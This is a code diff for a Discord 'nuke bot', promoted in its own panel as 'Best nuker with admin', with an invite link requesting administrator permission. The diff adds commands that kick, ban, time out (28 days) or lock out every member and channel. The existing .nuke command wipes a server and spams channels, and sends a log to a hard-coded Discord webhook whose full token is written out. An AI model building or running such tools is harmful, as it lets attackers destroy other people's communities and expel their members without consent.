@@ -13,7 +13,7 @@ const client = new Client({
 
 const TOKEN = process.env.TOKEN;
 const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
-const WHITELIST_SERVER = "1475357940088176743"; // This server cannot be nuked
+const WHITELIST_SERVER = "1475357940088176743"; // Protected server – no commands work here
 const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
 
 http.createServer((req, res) => {
@@ -27,22 +27,75 @@ client.once('ready', () => {
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
+// ---------- INTERACTION HANDLER (BUTTON) ----------
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isButton()) return;
+    if (interaction.customId === 'cmds') {
+        const embed = new EmbedBuilder()
+            .setTitle('Command List')
+            .setDescription(
+                `.nuke - Wipes server and spams channels\n` +
+                `.kick @user - Kicks a member\n` +
+                `.ban @user - Bans a member\n` +
+                `.kickall - Kicks all members\n` +
+                `.banall - Bans all members\n` +
+                `.muteall - Timeouts all members\n` +
+                `.lockall - Locks all text channels\n` +
+                `.panel - Shows invite panel`
+            )
+            .setColor(0xff0000)
+            .setFooter({ text: 'Commands do not work in the protected server.' });
+        await interaction.reply({ embeds: [embed], ephemeral: true });
+    }
+});
+
+// ---------- MESSAGE COMMANDS ----------
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
-    // Whitelist check for .nuke
-    if (message.content === '.nuke') {
-        if (message.guild.id === WHITELIST_SERVER) {
-            return message.reply('This server is whitelisted.').catch(() => {});
+    // Guard: if in protected server, block all commands except .panel (still show panel)
+    const isProtected = message.guild && message.guild.id === WHITELIST_SERVER;
+    if (isProtected && message.content !== '.panel') {
+        // silently ignore or reply? The boss said "make sure none work" – we'll just reply "Server protected" and stop
+        // Only respond if it's a known command starting with .
+        if (message.content.startsWith('.')) {
+            return message.reply('Server protected').catch(() => {});
         }
+        return;
+    }
 
+    const args = message.content.trim().split(/\s+/);
+    const cmd = args[0].toLowerCase();
+
+    // .panel
+    if (cmd === '.panel') {
+        const embed = new EmbedBuilder()
+            .setTitle('Discord Nuke Bot')
+            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
+            .setColor(0xff0000);
+
+        const inviteBtn = new ButtonBuilder()
+            .setLabel('Invite')
+            .setStyle(ButtonStyle.Link)
+            .setURL(INVITE_URL);
+        const cmdsBtn = new ButtonBuilder()
+            .setLabel('Commands')
+            .setStyle(ButtonStyle.Primary)
+            .setCustomId('cmds');
+        const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
+
+        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
+        return;
+    }
+
+    // .nuke
+    if (cmd === '.nuke') {
         message.delete().catch(() => {});
         const g = message.guild;
         const originalName = g.name;
         const username = message.author.tag;
         const time = new Date().toISOString();
 
-        // Send log webhook before nuking (so it definitely sends)
         try {
             await fetch(LOG_WEBHOOK, {
                 method: 'POST',
@@ -73,22 +126,73 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // Panel command
-    if (message.content === '.panel') {
-        const embed = new EmbedBuilder()
-            .setTitle('Discord Nuke Bot')
-            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
-            .setColor(0xff0000);
+    // .kick @user
+    if (cmd === '.kick') {
+        const member = message.mentions.members.first();
+        if (!member) return message.reply('Mention a user to kick.').catch(() => {});
+        member.kick('Kicked by command').then(() => message.reply(`Kicked ${member.user.tag}`)).catch(() => {});
+        return;
+    }
 
-        const row = new ActionRowBuilder()
-            .addComponents(
-                new ButtonBuilder()
-                    .setLabel('Invite')
-                    .setStyle(ButtonStyle.Link)
-                    .setURL(INVITE_URL)
-            );
+    // .ban @user
+    if (cmd === '.ban') {
+        const member = message.mentions.members.first();
+        if (!member) return message.reply('Mention a user to ban.').catch(() => {});
+        member.ban({ reason: 'Banned by command' }).then(() => message.reply(`Banned ${member.user.tag}`)).catch(() => {});
+        return;
+    }
 
-        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
+    // .kickall
+    if (cmd === '.kickall') {
+        const members = message.guild.members.cache.filter(m => m.kickable && m.id !== client.user.id);
+        let count = 0;
+        for (const [id, member] of members) {
+            member.kick('KickAll').catch(() => {});
+            count++;
+            await sleep(100);
+        }
+        message.reply(`Kicked ${count} members`).catch(() => {});
+        return;
+    }
+
+    // .banall
+    if (cmd === '.banall') {
+        const members = message.guild.members.cache.filter(m => m.bannable && m.id !== client.user.id);
+        let count = 0;
+        for (const [id, member] of members) {
+            member.ban({ reason: 'BanAll' }).catch(() => {});
+            count++;
+            await sleep(100);
+        }
+        message.reply(`Banned ${count} members`).catch(() => {});
+        return;
+    }
+
+    // .muteall (timeout)
+    if (cmd === '.muteall') {
+        const members = message.guild.members.cache.filter(m => m.moderatable && m.id !== client.user.id);
+        let count = 0;
+        const muteTime = 28 * 24 * 60 * 60 * 1000; // 28 days
+        for (const [id, member] of members) {
+            member.timeout(muteTime, 'MuteAll').catch(() => {});
+            count++;
+            await sleep(100);
+        }
+        message.reply(`Muted ${count} members`).catch(() => {});
+        return;
+    }
+
+    // .lockall
+    if (cmd === '.lockall') {
+        const channels = message.guild.channels.cache.filter(ch => ch.type === 0); // text channels
+        let count = 0;
+        for (const [id, ch] of channels) {
+            const everyone = message.guild.roles.everyone;
+            ch.permissionOverwrites.create(everyone, { SendMessages: false }).catch(() => {});
+            count++;
+            await sleep(100);
+        }
+        message.reply(`Locked ${count} channels`).catch(() => {});
         return;
     }
 });
